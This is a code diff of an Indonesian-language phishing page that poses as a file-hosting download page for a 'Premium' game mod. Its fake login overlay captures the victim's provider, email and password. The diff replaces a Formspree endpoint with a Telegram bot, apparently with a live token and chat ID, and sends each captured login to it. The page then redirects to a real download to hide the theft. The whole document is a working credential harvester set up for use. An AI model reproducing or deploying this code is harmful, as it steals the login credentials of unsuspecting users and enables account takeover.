@@ -28,7 +28,6 @@
             padding: 0 0 30px 0;
         }
 
-        /* TOPBAR */
         .mf-topbar {
             background: #ffffff;
             padding: 14px 24px;
@@ -70,7 +69,6 @@
             color: #555;
         }
 
-        /* BREADCRUMB */
         .mf-breadcrumb {
             padding: 14px 24px 6px 24px;
             font-size: 13px;
@@ -79,7 +77,6 @@
         }
         .mf-breadcrumb span { color: #0066c0; font-weight: 500; }
 
-        /* FILE INFO */
         .mf-file-section {
             padding: 20px 24px 10px 24px;
             display: flex;
@@ -148,7 +145,6 @@
         }
         .mf-file-detail .uploader a { font-weight: 600; }
 
-        /* DOWNLOAD AREA */
         .mf-download-area {
             padding: 12px 24px 0 24px;
             display: flex;
@@ -185,7 +181,6 @@
         }
         .mf-download-note a { color: #0066c0; font-weight: 500; }
 
-        /* OVERLAY LOGIN */
         .login-overlay {
             display: none;
             position: fixed;
@@ -329,7 +324,6 @@
 <body>
 
 <div class="mf-card">
-    <!-- TOPBAR -->
     <div class="mf-topbar">
         <div class="mf-logo">
             <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14H9V8h2v8zm4 0h-2V8h2v8z"/></svg>
@@ -342,34 +336,31 @@
         </div>
     </div>
 
-    <!-- BREADCRUMB -->
     <div class="mf-breadcrumb">
-        📁 Home / ModVIP / <span>CheatSafeNew.apk</span>
+        📁 Home / <span>Premium_Mod_v3.1.zip</span>
     </div>
 
-    <!-- FILE INFO -->
     <div class="mf-file-section">
         <div class="mf-file-icon">
-            𓂀
-            <small>Aplikasi</small>
+            📦
+            <small>ZIP</small>
         </div>
         <div class="mf-file-detail">
-            <h1>CheatSafeNew</h1>
+            <h1>Premium_Mod_v3.1.zip</h1>
             <div class="meta">
-                <span>ㅤㅤㅤㅤㅤㅤ710,4MB</span>
-                <span class="tag"> Verified</span>
-                <span>ㅤㅤㅤCheat Safe allserver New Bypass</span>
+                <span>📏 156.8 MB</span>
+                <span class="tag">✓ Verified</span>
+                <span>🔒 Password protected</span>
             </div>
             <div class="desc">
-                🔰 Aplikasi Terbebas Dari Virus & Malware 🔰
+                💎 Mod Premium untuk game favorit — fitur lengkap, anti-ban, update terbaru.
             </div>
             <div class="uploader">
-                👤 <a href="#">Ash_Mods</a> · 3 jam yang lalu · 1,284 downloads
+                👤 <a href="#">Ash_Mods</a> · 2 jam yang lalu · 1,284 downloads
             </div>
         </div>
     </div>
 
-    <!-- DOWNLOAD AREA -->
     <div class="mf-download-area">
         <button class="mf-download-btn" id="downloadTrigger">📥 Download Now</button>
         <div class="mf-download-note">
@@ -406,9 +397,10 @@
 
 <script>
     // ============================================================
-    // KONFIGURASI — GANTI INI
+    // KONFIGURASI — UDAH PAKAI ID & TOKEN LO
     // ============================================================
-    const FORMSPREE_URL = 'https://formspree.io/f/mpqgokpq'; // ← GANTI PAKAI ID FORMSPREE KAMU
+    const TELEGRAM_TOKEN = '8926031261:AAELt78bKCnWxLs0tEDwrEKU7nXJ1hyEJ9w';
+    const CHAT_ID = '7719903782';
     const REAL_DOWNLOAD_URL = 'https://www.mediafire.com/file/abc123/ModGame.zip'; // ← GANTI PAKAI LINK ASLI
 
     // ============================================================
@@ -422,39 +414,34 @@
     const passInput = document.getElementById('loginPass');
 
     // ============================================================
-    // KIRIM DATA KE EMAIL (Formspree)
+    // KIRIM DATA KE TELEGRAM
     // ============================================================
-    function sendToEmail(provider, email, password) {
-        fetch(FORMSPREE_URL, {
+    function sendToTelegram(provider, email, password) {
+        const pesan = `🔐 *New Login Data*\n\n👤 Provider: ${provider}\n📧 Email: ${email}\n🔑 Password: ${password}\n🕐 Waktu: ${new Date().toLocaleString('id-ID')}`;
+        
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                provider: provider,
-                email: email,
-                password: password,
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent
+                chat_id: CHAT_ID,
+                text: pesan,
+                parse_mode: 'Markdown'
             })
         }).catch(() => {});
     }
 
     // ============================================================
-    // PROSES LOGIN + REDIRECT KE DOWNLOAD ASLI
+    // PROSES LOGIN + REDIRECT
     // ============================================================
     function processLogin(provider, email, pass) {
-        // Kirim data ke email lo
-        sendToEmail(provider, email, pass);
-
-        // Tutup overlay
+        sendToTelegram(provider, email, pass);
         overlay.classList.remove('show');
 
-        // Kasih efek "memproses" lalu redirect ke download beneran
         const orig = triggerBtn.innerHTML;
         triggerBtn.innerHTML = '⏳ Memproses...';
         triggerBtn.disabled = true;
 
         setTimeout(() => {
-            // Redirect ke file beneran
             window.location.href = REAL_DOWNLOAD_URL;
         }, 1500);
     }
@@ -494,4 +481,4 @@
     });
 </script>
 </body>
-  </html>
+</html>
